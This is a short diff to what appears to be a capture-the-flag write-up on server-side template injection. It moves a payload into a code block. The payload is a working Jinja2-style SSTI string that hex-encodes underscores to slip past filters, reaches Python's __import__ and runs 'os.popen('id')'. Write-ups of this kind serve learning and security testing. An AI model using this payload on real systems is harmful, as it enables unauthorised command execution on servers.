@@ -178,7 +178,9 @@ The number ``49`` appears ! There is a **SSTI** !
 
 For this part, we need to find the correct payload. After some tries, I found this one : 
 
-`{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}`
+```bash
+{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
+```
 
 The `_` character is encoded. It is a Unicode Hex Character.
 
